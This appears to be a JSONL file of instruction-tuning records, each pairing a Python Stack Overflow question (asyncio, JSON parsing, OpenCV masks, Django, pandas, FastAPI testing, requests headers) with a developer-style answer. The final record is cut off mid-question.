{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Using asyncio.wait, my can't I tell if my Event.wait task is in done or pending?<p>I'm receiving messages in a loop, and I want the loop to be cancel-able, so I'm using an <code>asyncio.Event<\/code> object to act as a flag for when the loop should exit, like this:<\/p>\n<pre><code>class MyThing:\n    def __init__(self):\n        self.quit = asyncio.Event\n\n    async def loop(self):\n        while True:\n            t1 = self.quit.Wait()\n            t2 = self.recv_message()\n            done, pending = asyncio.wait([t1, t2], return_when=asyncio.FIRST_COMPLETED)\n\n            if t1 in done:\n                break\n<\/code><\/pre>\n<p>The problem is that <code>t1 in done<\/code> returns <code>False<\/code>, even when <code>t1<\/code> is in <code>done<\/code>.  Sticking a breakpoint just before that <code>if<\/code> statement, I can see that <code>t1<\/code> looks like this:<\/p>\n<pre><code>(Pdb) p t1\n&lt;coroutine object Event.wait at 0x7fcff72ed340&gt;\n<\/code><\/pre>\n<p>But <code>done<\/code> looks like this:<\/p>\n<pre><code>{&lt;Task finished name='Task-95' coro=&lt;Event.wait() done, defined at \/usr\/lib64\/python3.8\/asyncio\/locks.py:296&gt; result=True&gt;}\n<\/code><\/pre>\n<p>There are a number of ways to work around this, of course.  I can write:<\/p>\n<pre><code>if t2 not in done:\n<\/code><\/pre>\n<p>Which seems to work correctly. I could also check for <code>self.quit.is_set()<\/code>. But why doesn't this <code>t1 in done<\/code> test work the way I expect?<\/p>","output_text":"<blockquote>\n<p>But why doesn't this <code>t1 in done<\/code> test work the way I expect?<\/p>\n<\/blockquote>\n<p>Because <code>asyncio.wait<\/code> accepts any kind of <em>awaitable<\/em> objects, those that work with the <code>await<\/code> keyword, and most notably objects obtained by calling an <code>async def<\/code>. The objects it returns are <em>futures<\/em>, subclasses of <code>asyncio.Future<\/code>, most notably <code>Task<\/code> instances. Futures can run in the background and support an array of methods which enable <code>wait<\/code>, such as <code>add_done_callback<\/code>, <code>result<\/code>, etc.<\/p>\n<p>The first thing <code>asyncio.wait<\/code> does with the awaitables it receives is convert them to futures using <code>asyncio.ensure_future<\/code>, which turns coroutine objects into tasks, and in general other awaitables into appropriate types of future. It works with futures from then on, and it returns them. This confusion is even described in the <a href=\"https:\/\/docs.python.org\/3\/library\/asyncio-task.html#asyncio.wait\" rel=\"nofollow noreferrer\">documentation<\/a>, even prompting the devs to deprecate passing non-futures to <code>asyncio.wait<\/code>.<\/p>\n<p>The workaround that will enable <code>t1 in done<\/code> to work is for you to call <code>ensure_future<\/code> (or <code>create_task<\/code> when you know you're dealing with a coroutine yourself):<\/p>\n<pre><code>t1 = asyncio.ensure_future(self.quit.Wait())\nt2 = asyncio.ensure_future(self.recv_message())\n<\/code><\/pre>\n<p>On a side note, you don't need an event to make the loop cancelable, you could use cancelation:<\/p>\n<pre><code>class MyThing:\n    def __init__(self):\n        # cancel the loop_task with self.loop_task.cancel()\n        self.loop_task = None\n\n    async def loop(self):\n        self.loop_task = asyncio.create_task(self._loop())\n        await self.loop_task\n\n    async def _loop(self):\n        while True:\n            await self.recv_message()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python - json.loads large file of dictionaries that are not connected<p>I have a large (50,000+ lines) file that is a collection of json outputs from another application that i would like to read in as json and perform some analysis on. The issue is that while a single entry is valid json, I can't read the entire file in as json because each entry isn't connected.<\/p>\n<p>Snippet:<\/p>\n<pre><code>{&quot;action&quot;:&quot;Iops&quot;,&quot;idg&quot;:&quot;2214472975167211&quot;,&quot;idx&quot;:537994,&quot;system&quot;:&quot;Qos&quot;,&quot;utc&quot;:&quot;2019-07-02T11:45:09.606765Z&quot;,&quot;ver&quot;:&quot;1.1&quot;,&quot;xQosIops&quot;:{&quot;ActualReadOps&quot;:{&quot;avg&quot;:0,&quot;ct&quot;:60,&quot;max&quot;:0,&quot;min&quot;:0,&quot;std&quot;:0,&quot;tmax&quot;:29880,&quot;tmin&quot;:29880}}}\n{&quot;action&quot;:&quot;Latency&quot;,&quot;idg&quot;:&quot;2214472975167211&quot;,&quot;idx&quot;:537995,&quot;system&quot;:&quot;Qos&quot;,&quot;utc&quot;:&quot;2019-07-02T11:45:09.606829Z&quot;,&quot;ver&quot;:&quot;1.1&quot;,&quot;xQosLatency&quot;:{&quot;AverageLocalWriteLatencyUS&quot;:{&quot;avg&quot;:0,&quot;ct&quot;:60,&quot;max&quot;:0,&quot;min&quot;:0,&quot;std&quot;:0,&quot;tmax&quot;:29880,&quot;tmin&quot;:29880}}}\n<\/code><\/pre>\n<p>Individually they are both valid, but what I would like to achieve is dynamically connect all of these into a single json object. It is important to note that these json responses could span multiple lines, so I can't just read in line by line. Any help would be appreciated.<\/p>","output_text":"<p>You can load the contents of the file with vanilla Python (not using the <code>json<\/code> package), then use <code>json<\/code> to parse each individual line.<\/p>\n<p>Example:<\/p>\n<pre><code>import json\n\ndata_fp = &quot;\/path\/to\/data.txt&quot;\n\nwith open(data_fp, &quot;r&quot;) as f:\n    lines = f.readlines()\n\n# now, parse each line as a JSON string\njson_object = [json.loads(l) for l in line]\n\n# optional: dump as a JSON file\nwith open(&quot;\/path\/to\/output.json&quot;, &quot;w&quot;) as f:\n    json.dump(json_object, f)\n<\/code><\/pre>\n<p><strong>Edit:<\/strong> if each dictionary is not necessarily limited to a single line, you could try parsing JSON for a variable number of lines until it succeeds (continuing from above example):<\/p>\n<pre><code>start_line = 0\nend_line = 1\njson_object = []\nwhile end_line &lt;= len(lines):\n    try:\n        data = json.loads(&quot;&quot;.join(lines[start_line:end_line]))\n    except:\n        end_line += 1\n    else:\n        json_object.append(data)\n        start_line = end_line\n        end_line = start_line + 1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Make circular mask and put all values outside of mask to black<p>I've got a color jpg-image of a lion. I've drawn a white circle on the image, converted this image to greyscale and defined a mask. In the end, I want to have an image with only the original pixels within the white circle. I think I'm almost there, but I can't seem to figure out the last step to put all values outside the mask\/white circle to black. Here is my code:<\/p>\n<pre><code>import cv2\n\nimg = cv2.imread('lion_original.jpg')\ncenter_coordinates = (120,50)\nradius = 20\ncolor = (255, 255 , 255)\nthickness = -1\nimg = cv2.circle(img, center_coordinates, radius, color, thickness)\ngray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\ncv2.imshow('try_mask', gray) \nmask = gray&gt;254\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/t9Ndz.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/t9Ndz.jpg\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>What you're doing, that is, adding the white circle to the original image, converting that to grayscale and then thresholding is a bad idea: there might be pixels outside of that circle that have values greater than your threshold, and then they will also be included in the mask itself. A quick fix is to create the white circle on a black image. The following snippet gives results that I think correspond to what you need:<\/p>\n<pre><code>img = cv2.imread('A.jpg')\ncenter= (120,50)\nradius = 20 \ncolor = (255, 255 , 255)\nthickness = -1 \nfinal_image = cv2.circle(np.zeros_like(img), center, radius, color,     thickness).astype(&quot;uint8&quot;)\nfinal_image[final_image!=0]=img[final_image!=0]\n<\/code><\/pre>\n<p>Note: in case there are issues when you visualize <code>final_image<\/code>, try normalizing it with<\/p>\n<pre><code>final_image=cv2.normalize(src=final_image, dst=None, alpha=0, beta=255, norm_type=cv2.NORM_MINMAX, dtype=cv2.CV_8U)\n<\/code><\/pre>\n<p>before calling <code>cv2.imshow()<\/code>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n If the username or password is invalid when logging in, how can appear an error on page without refreshing itself, Django<p>I have a login pop-up and I want after typing wrong username or password to appear a error message, like usual 'Username or password is incorrect', but after pressing button on the site, it is refreshing and I need to open my pop-up again in order to see the error, how can I do the error msg to appear without refreshing the page.<\/p>\n<p><strong>Views.py<\/strong><\/p>\n<pre><code>def main(request):\n    form = CreateUserForm()\n\n    if &quot;register-btn&quot; in request.POST:\n        ....\n\n    elif &quot;login-btn&quot; in request.POST:\n        username = request.POST.get('username-log')\n        password = request.POST.get('password-log')\n        user = authenticate(request, username=username, password=password)\n        if user is not None:\n            login(request, user)\n            return redirect('\/account')\n        else:\n            messages.info(request, 'Username or password is incorrect')\n            #here I don't know what to write for the purpose of appearing the \n            #error messages on the page without refreshing it\n\n    return render(request, 'accounts\/main.html', context)\n<\/code><\/pre>\n<p><strong>Main.html<\/strong> ( briefly )<\/p>\n<pre><code>&lt;label&gt;Your login&lt;\/label&gt;\n&lt;input name=&quot;username-log&quot; class=&quot;form-control&quot; type=&quot;text&quot; placeholder=&quot;Enter your login&quot;&gt;\n\n&lt;label&gt;Password&lt;\/label&gt;\n&lt;input name=&quot;password-log&quot; class=&quot;form-control&quot; type=&quot;password&quot; placeholder=&quot;Enter your password&quot;&gt;\n\n   {% for message in messages %}\n      &lt;p id=&quot;messages&quot; class=&quot;xerr&quot;&gt; {{message}} &lt;\/p&gt;\n   {% endfor %}\n\n&lt;button name=&quot;login-btn&quot; class=&quot;btn btn_100&quot; type=&quot;submit&quot;&gt;LOG IN&lt;\/button&gt;\n<\/code><\/pre>","output_text":"<p>I can see that OP has the concern to inform the users about what's going on and decided to use the <a href=\"https:\/\/docs.djangoproject.com\/en\/4.1\/ref\/contrib\/messages\/\" rel=\"nofollow noreferrer\">messages framework<\/a> for that - that's great. Now the question that pops up is &quot;How can one do that without the page refreshing?&quot;.<\/p>\n<p>As <a href=\"https:\/\/stackoverflow.com\/questions\/73692403\/if-the-username-or-password-is-invalid-when-logging-in-how-can-appear-an-error#comment130132039_73692403\">nigel239 mentions<\/a>, one'll have to go with asynchronous JavaScript. There are various Q&amp;As articles that explain how to submit the forms asynchronously, such as<\/p>\n<ul>\n<li><a href=\"https:\/\/realpython.com\/django-and-ajax-form-submissions\/\" rel=\"nofollow noreferrer\">Django and AJAX Form Submissions \u2013 Say 'Goodbye' to the Page Refresh<\/a><\/li>\n<li><a href=\"https:\/\/www.pluralsight.com\/guides\/work-with-ajax-django\" rel=\"nofollow noreferrer\">How to Work with AJAX in Django<\/a><\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Web2py.exe Immediately Closes<p>Following a tutorial, I have downloaded the Web2py Windows binaries.  When I open web2py.exe, I get a quick command prompt screen.  It immediately closes.  I have uninstalled previous versions of Python, with no change.  I also followed a recommendation from another post to create a .bat file to see the error.  When I run it, I get the following:<\/p>\n\n<pre><code>    Traceback (most recent call last):\n       file \"&lt;string&gt;\", line 6, in &lt;module&gt;\n       file \"__main__.py\", line 128, in &lt;module&gt;\n       file \"__main_web2py__.py\", line 33, in &lt;module&gt;\n    TypeError:  start() takes no arguments (1 given)\n<\/code><\/pre>","output_text":"<p>Try installing pythone 32 bit version and web2py source version.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Imputing Missing Values in Python<p>I want to impute a couple of columns in my data frame using Scikit-Learn <code>SimpleImputer<\/code>. I tried doing this, but with no luck. How should I modify my code? <code>a<\/code>, <code>b<\/code>, <code>e<\/code> are the columns in my data frame that I want to impute.<\/p>\n<p>My data frame:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>    a   b   c   d      e\n    NA  39  cat gray   20\n    5   NA  dog brown  NA\n    7   53  cat tan    33\n    NA  NA  cat black  41\n    4   24  dog tan    NA\n<\/code><\/pre>\n<p>My code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from sklearn.impute import SimpleImputer\n\nmiss_mean_imputer = SimpleImputer(missing_values='NaN', strategy='mean', axis=0)\n\nmiss_mean_imputer = miss_mean_imputer.fit(df[&quot;a&quot;, &quot;b&quot;, &quot;e&quot;])\n\nimputed_df = miss_mean_imputer.transform(df.values)\n\nprint(imputed_df)\n<\/code><\/pre>","output_text":"<p>You should replace <code>missing_values='NaN'<\/code> with <code>missing_values=np.nan<\/code> when instantiating the imputer and you should also make sure that the imputer is used to transform the same data to which it has been fitted, see the code below.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\nimport numpy as np\nfrom sklearn.impute import SimpleImputer\n\ndf = pd.DataFrame({\n 'a': [np.nan, 5.0, 7.0, np.nan, 4.0],\n 'b': [39.0, np.nan, 53.0, np.nan, 24.0],\n 'c': ['cat', 'dog', 'cat', 'cat', 'dog'],\n 'd': ['gray', 'brown', 'tan', 'black', 'tan'],\n 'e': [20.0, np.nan, 33.0, 41.0, np.nan]\n})\n\nimputer = SimpleImputer(missing_values=np.nan, strategy='mean')\nimputer = imputer.fit(df[['a', 'b', 'e']])\n\nimputed_df = df.copy()\nimputed_df[['a', 'b', 'e']] = imputer.transform(df[['a', 'b', 'e']])\n\nprint(imputed_df)\n#           a          b    c      d          e\n# 0  5.333333  39.000000  cat   gray  20.000000\n# 1  5.000000  38.666667  dog  brown  31.333333\n# 2  7.000000  53.000000  cat    tan  33.000000\n# 3  5.333333  38.666667  cat  black  41.000000\n# 4  4.000000  24.000000  dog    tan  31.333333\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Switch to test database using FastAPI and ormar<p>I am trying ormar with FastAPI and struggling with testing.\nBecause I use Django in the majority of my projects, I am trying to separate my databases between development and testing. But I am struggling to do this.<\/p>\n<p>The goal is basically, use PostgreSQL for development\/production, but switch to SQLite when running pytest. And remove all data from the SQLite database when tests are done.(Imagine Django+Docker dev environment)<\/p>\n<p>I've tried the following from the ormar documentation, but no luck.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>TEST_DB_URL = &quot;sqlite:\/\/\/..\/db.sqlite&quot;\n\n@pytest.fixture(autouse=True, scope=&quot;module&quot;)\ndef create_test_database():\n    engine = sqlalchemy.create_engine(TEST_DB_URL)\n    metadata.create_all(engine)\n    yield\n    metadata.drop_all(engine)\n<\/code><\/pre>\n<p>After the above and when I try to do something with the database in tests(using pytest), the following error occurs.<\/p>\n<pre><code>====================================================================================== FAILURES =======================================================================================\n_______________________________________________________________________________ test_user_registration ________________________________________________________________________________\n\ndb = &lt;function db.&lt;locals&gt;.wrapper at 0x7fb7d30c9820&gt;\n\n    @pytest.mark.asyncio\n    async def test_user_registration(db):\n&gt;       users = await db(User.objects.all)\n\napp\/users\/test_users.py:51: \n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\napp\/conftest.py:39: in wrapper\n    return await func()\n\/usr\/local\/lib\/python3.9\/site-packages\/ormar\/queryset\/queryset.py:1016: in all\n    rows = await self.database.fetch_all(expr)\n\/usr\/local\/lib\/python3.9\/site-packages\/databases\/core.py:147: in fetch_all\n    async with self.connection() as connection:\n\/usr\/local\/lib\/python3.9\/site-packages\/databases\/core.py:251: in __aenter__\n    raise e\n\/usr\/local\/lib\/python3.9\/site-packages\/databases\/core.py:248: in __aenter__\n    await self._connection.acquire()\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\n\nself = &lt;databases.backends.postgres.PostgresConnection object at 0x7fb7d319e910&gt;\n\n    async def acquire(self) -&gt; None:\n        assert self._connection is None, &quot;Connection is already acquired&quot;\n&gt;       assert self._database._pool is not None, &quot;DatabaseBackend is not running&quot;\nE       AssertionError: DatabaseBackend is not running\n\n\/usr\/local\/lib\/python3.9\/site-packages\/databases\/backends\/postgres.py:162: AssertionError\n=============================================================================== short test summary info ===============================================================================\nFAILED app\/users\/test_users.py::test_user_registration - AssertionError: DatabaseBackend is not running\n<\/code><\/pre>\n<p>My database setup looks like this and this works just fine saving data etc via regular API calls.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import os\n\nimport databases\nfrom fastapi import FastAPI\nimport sqlalchemy\n\nfrom app.resources.utils import get_models_path_list\n\nmodels_path_list = get_models_path_list()\n\n\ndef get_db_uri(*, user, password, host, db):\n    return f'postgresql:\/\/{user}:{password}@{host}:5432\/{db}'\n\n\nDB_URL = get_db_uri(\n    user=os.environ.get('POSTGRES_USER'),\n    password=os.environ.get('POSTGRES_PASSWORD'),\n    host='db',  # docker-compose\u306eservice\u540d\n    db=os.environ.get('POSTGRES_DB'),\n)\ndatabase = databases.Database(DB_URL)\nmetadata = sqlalchemy.MetaData()\n\n\ndef setup_database(app: FastAPI):\n    app.state.database = database\n\n    @app.on_event(&quot;startup&quot;)\n    async def startup() -&gt; None:\n        database_ = app.state.database\n        if not database_.is_connected:\n            await database_.connect()\n\n    @app.on_event(&quot;shutdown&quot;)\n    async def shutdown() -&gt; None:\n        database_ = app.state.database\n        if database_.is_connected:\n            await database_.disconnect()\n<\/code><\/pre>","output_text":"<p>I struggled there too. First of all <a href=\"https:\/\/github.com\/collerek\/ormar\/discussions\/136\" rel=\"nofollow noreferrer\">this<\/a> discussion will help you.\nCrux here.\nYou need to use an environment variable that points to your sqlite db.\nI did use BaseSettings from FastAPI and added this method there<\/p>\n<pre><code>def get_db_uri(self) -&gt; str:\n    # set the below in your environment file when running tests\n    if self.TESTING:\n        return &quot;sqlite:\/\/\/..\/db.sqlite&quot;\n\n    if self.PRODUCTION:\n        return self._get_db_uri(\n            user=&quot;root&quot;,\n            passwd=self.POSTGRES_PASSWORD,\n            host=self.AURORA_DB_URI,\n            port=self.POSTGRES_PORT,\n            db=self.POSTGRES_DB,\n        )\n\n    return self._get_db_uri(\n        user=self.POSTGRES_USER,\n        passwd=self.POSTGRES_PASSWORD,\n        host=self.POSTGRES_HOST,\n        port=self.POSTGRES_PORT,\n        db=self.POSTGRES_DB,\n    )\n<\/code><\/pre>\n<p>One other thing which i was missing was that fixture for dropping and creating tables. You already have that there.<\/p>\n<pre><code>TEST_DB_URL = &quot;sqlite:\/\/\/..\/db.sqlite&quot;\n\n@pytest.fixture(autouse=True, scope=&quot;module&quot;)\ndef create_test_database():\n    engine = sqlalchemy.create_engine(TEST_DB_URL)\n    metadata.create_all(engine)\n    yield\n    metadata.drop_all(engine)\n<\/code><\/pre>\n<p>You can use <a href=\"https:\/\/github.com\/MobileDynasty\/pytest-env\" rel=\"nofollow noreferrer\">pytest-env<\/a> for setting environment variables in tests.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n learning how to cast numeric input<p>first time asking a question.<\/p>\n<p>I am learning how to cast numeric input (learning from an edX course and using jupyter notebook). This is my code:<\/p>\n<pre><code>calc_1 = input(&quot;What is the first number? (use integers): &quot;)\ncalc_2 = input(&quot;What is the second number? (use integers): &quot;)\n\nadd_calcs = int(calc_1) + int(calc_2)\nfinal_calc = int(calc_1),&quot; + &quot;,int(calc_2),&quot;=&quot;,(add_calcs) \n\nprint(final_calc)\n<\/code><\/pre>\n<p><strong>Why is my output coming out like this?:<\/strong><\/p>\n<blockquote>\n<p>What is the first number? (use integers): 1<\/p>\n<p>What is the second number? (use integers): 2<\/p>\n<p>(1, ' + ', 2, '=', 3)<\/p>\n<\/blockquote>\n<p>Thanks in advance<\/p>","output_text":"<p>This line:<\/p>\n\n<pre><code>final_calc = int(calc_1),\" + \",int(calc_2),\"=\",(add_calcs)\n<\/code><\/pre>\n\n<p>is syntactically equivalent to:<\/p>\n\n<pre><code>final_calc = (int(calc_1),\" + \",int(calc_2),\"=\",(add_calcs))\n<\/code><\/pre>\n\n<p>So <code>final_calc<\/code> is a tuple, and <code>print<\/code> will display it as such. One way to pass it to <code>print<\/code>, so that it prints each item individually is:<\/p>\n\n<pre><code>print(*final_calc)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Iterating a list VS using pandas<p>I have a large list called reassembly organized like this:<\/p>\n\n<pre><code>['HYDR', 30472.0, 'B'], ['HYDR', 30470.0, 'S'], ['HYDR', 30474.0, 'B'].....\n<\/code><\/pre>\n\n<p>A piece of my code:<\/p>\n\n<pre><code>sum_buys = 0\nsum_sells = 0\nfor deal in reassembly:\n    ticker, vol, oper = deal[0], deal[1], deal[2]\n    if oper == \"B\":\n        sum_buys = sum_buys + vol\n    elif oper == \"S\":\n        sum_sells = sum_sells + vol\n<\/code><\/pre>\n\n<p>List is very large. It takes about 5 minutes to run from start to end. Very long time.<\/p>\n\n<p>Can pandas library help me to do it faster? I never worked with it.<\/p>\n\n<p>What should i do?<\/p>\n\n<ol>\n<li><p>Convert list called reassembly to pandas dataframe<\/p><\/li>\n<li><p>Use pandas methods to count both parameters: sum_buys and sum_sells<\/p><\/li>\n<\/ol>\n\n<p>Help me please!<\/p>","output_text":"<p>Yes, you can and should convert the list into a pandas dataframe and use <code>groupby()<\/code>:<\/p>\n\n<pre><code>df = pd.DataFrame(reassembly, columns=['tickers','vol','operation'])\n\ndf.groupby('operation')['vol'].sum()\n<\/code><\/pre>\n\n<p>Output for the sample data:<\/p>\n\n<pre><code>operation\nB    60946.0\nS    30470.0\nName: vol, dtype: float64\n<\/code><\/pre>\n\n<p>Also, say, maybe you're interested in buy\/sell total per ticker, you can do:<\/p>\n\n<pre><code>df.groupby(['tickers','operation'])['vol'].sum()\n<\/code><\/pre>\n\n<p>and get something like this:<\/p>\n\n<pre><code>tickers  operation\nHYDR     B            60946.0\n         S            30470.0\nName: vol, dtype: float64\n<\/code><\/pre>\n\n<p>To ignore deals with <code>vol&lt;100000<\/code>, we can keep all deals with <code>vol &gt;= 100000<\/code> by<\/p>\n\n<pre><code>df = df[df['vol']&gt;=100000]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Splitting data frame into smaller data frames based on unique column values<p>this is my data frame:<\/p>\n<pre><code>    Quantity     Code         Value       \n0       1757     08951201     717.0\n1       1100     08A85800       0.0\n2       2500     08A85800       0.0\n3        323     08951201       0.0\n4        800     08A85800       0.0\n<\/code><\/pre>\n<p>and i what to split this into smaller data frames created based on Code column. (E.g. this one should split into df1 with all 08951201 codes and df2 with 08A85800)<\/p>\n<p>Edit:\nAnd I'd love to have a way to merge them back into original dataframe in the same order after some value calculations im gonna perform.<\/p>","output_text":"<p>As suggested you could use <code>groupby()<\/code> on your dataframe to segregate by one column name values:<\/p>\n<pre><code>import pandas as pd\n\ncols = ['Quantity', 'Code', 'Value']\ndata = [[1757,     '08951201',     717.0],\n [1100,     '08A85800',       0.0],\n [2500,     '08A85800',       0.0],\n [323,    '08951201',      0.0],\n [800,    '08A85800',       0.0]]\n\ndf = pd.DataFrame(data, columns=cols)\n\ngroups =df.groupby(['Code'])\n<\/code><\/pre>\n<p>Then you can recover indices by  <code>groups.indices <\/code>, this will return a dict with 'Code' values as keys, and index as values. For last if you want to get every sub-dataframe you can call <code>group_list = list(groups)<\/code>. I suggest to do the work in 2 steps (first group by, then call list), because this way you can call other methods over the groupDataframe (<code>group<\/code>)<\/p>\n<hr \/>\n<p><strong>EDIT<\/strong><\/p>\n<p>Then if you want a particular dataframe you could call<\/p>\n<pre><code> df_i = group_list[i][1]\n<\/code><\/pre>\n<p><code>group_list[i]<\/code> is the i-th element of sub-dataframe, but it's a tupple containing <code>(group_val,group_df)<\/code>. where <code>group_val<\/code> is the value associated to this new dataframe (<code>'08951201'<\/code> or <code>'08A85800'<\/code>) and <code>group_df<\/code> is the new dataframe.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pandas Pivot Table with multilevel index<p>I have a df with items and their yearly sales. I would like to change it to pivot table but with the two levels index.<\/p>\n<p>My DF:<\/p>\n<pre><code>date    brand_id    brand_name  art_id  art_name    count_art\n2015    1           cat         10      A           120\n2016    1           cat         10      A           100\n2017    1           cat         12      B           80\n2015    2           dog         20      C           100\n2016    2           dog         25      D           110\n2015    3           bird        30      E           50\n2017    3           bird        31      F           90\n<\/code><\/pre>\n<p>I want the result to be like this:<\/p>\n<pre><code>                                2015                            2016                            2017            \nbrand_id    brand_name  art_id  art_name    count_art   art_id  art_name    count_art   art_id  art_name    count_art\n1           cat         10      A           120         10      A           100         12      B           80      \n2           dog         20      C           100         25      D           110         null    null        null    \n3           bird        30      E           50          null    null        null        31      F           90  \n<\/code><\/pre>\n<p>For now I have tried following command:<\/p>\n<pre><code>transformed_data = df.pivot_table(values=['art_id', 'art_name', 'count_art'], index=['brand_id', 'brand_name'], columns='date', aggfunc='first')\n<\/code><\/pre>\n<p>However it isn't working as expected. I know how to change rows to yearly columns however I don't know how to change multiple columns in multiple rows to one row with more columns.<\/p>","output_text":"<p>Add <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.swaplevel.html\" rel=\"nofollow noreferrer\"><code>DataFrame.swaplevel<\/code><\/a> with <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.sort_index.html\" rel=\"nofollow noreferrer\"><code>DataFrame.sort_index<\/code><\/a>:<\/p>\n<pre><code>df = (df.pivot_table(values=['art_id', 'art_name', 'count_art'], \n                    index=['brand_id', 'brand_name'], \n                    columns='date', \n                    aggfunc='first')\n        .swaplevel(1, 0, axis=1)\n        .sort_index(level=0, axis=1, sort_remaining=False))\nprint (df)\ndate                  2015                      2016                     \\\n                    art_id art_name count_art art_id art_name count_art   \nbrand_id brand_name                                                       \n1        cat          10.0        A     120.0   10.0        A     100.0   \n2        dog          20.0        C     100.0   25.0        D     110.0   \n3        bird         30.0        E      50.0    NaN      NaN       NaN   \n\ndate                  2017                     \n                    art_id art_name count_art  \nbrand_id brand_name                            \n1        cat          12.0        B      80.0  \n2        dog           NaN      NaN       NaN  \n3        bird         31.0        F      90.0 \n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to pass Authorization TOKEN into Python requests header<p>I am trying to make a http request using Python3.8.5 + requests 2.25.0. The request contains Authorization Token in the header.<\/p>\n<p>When use Postman to make the request, I can get response without issue. But, when I use following python code to make the request, it returns 401. Not sure what is worng in the code.<\/p>\n<pre><code>401  {&quot;detail&quot;:&quot;Authentication credentials were not provided.&quot;}\n<\/code><\/pre>\n<p>Following are the python code having issues.<\/p>\n<pre><code>import requests\n\nurl = &lt;MY_URL&gt;\n\npayload={}\nheaders = {\n  'Authorization': 'TOKEN &lt;MY_TOKEN&gt;'\n}\n\nresponse = requests.request(&quot;GET&quot;, url, headers=headers, data=payload)\n\nprint(response.text)\n<\/code><\/pre>","output_text":"<p>The problem resloved by adding a \/ at the end of the request url. :-)<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Retrieving BigQuery validation errors when loading JSONL data via the Python API<p>How can I retrieve more information relating to the validation errors when loading a JSONL file into BigQuery? (The question is not about solving the issue)<\/p>\n<p>Example code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from google.cloud.bigquery import (\n    LoadJobConfig,\n    QueryJobConfig,\n    Client,\n    SourceFormat,\n    WriteDisposition\n)\n\n# variables depending on the environment\nfilename = '...'\ngcp_project_id = '...'\ndataset_name = '...'\ntable_name = '...'\nschema = [ ... ]\n\n# loading data\nclient = Client(project=project_id)\ndataset_ref = client.dataset(dataset_name)\ntable_ref = dataset_ref.table(table_name)\njob_config = LoadJobConfig()\njob_config.source_format = SourceFormat.NEWLINE_DELIMITED_JSON\njob_config.write_disposition = WriteDisposition.WRITE_APPEND\njob_config.schema = schema\nLOGGER.info('loading from %s', filename)\nwith open(filename, &quot;rb&quot;) as source_file:\n    job = client.load_table_from_file(\n        source_file, destination=table_ref, job_config=job_config\n    )\n\n    # Waits for table cloud_data_store to complete\n    job.result()\n<\/code><\/pre>\n<p>Here I am using <a href=\"https:\/\/pypi.org\/project\/bigquery-schema-generator\/\" rel=\"nofollow noreferrer\">bigquery-schema-generator<\/a> to generate a schema (as BigQuery otherwise only looks at the first 100 rows).<\/p>\n<p>Running that might error with the following error message (<code>google.api_core.exceptions.BadRequest<\/code>):<\/p>\n<blockquote>\n<p>400 Error while reading data, error message: JSON table encountered too many errors, giving up. Rows: 1; errors: 1. Please look into the errors[] collection for more details.<\/p>\n<\/blockquote>\n<p>Looking at the <code>errors<\/code> property basically doesn't provide any new information:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>[{'reason': 'invalid',\n  'message': 'Error while reading data, error message: JSON table encountered too many errors, giving up. Rows: 1; errors: 1. Please look into the errors[] collection for more details.'}]\n<\/code><\/pre>\n<p>I also looked at <code>__dict__<\/code> of the exception but that hasn't revealed any further information.<\/p>\n<p>Trying to load the table using the <code>bq<\/code> command line (in this case without explicit 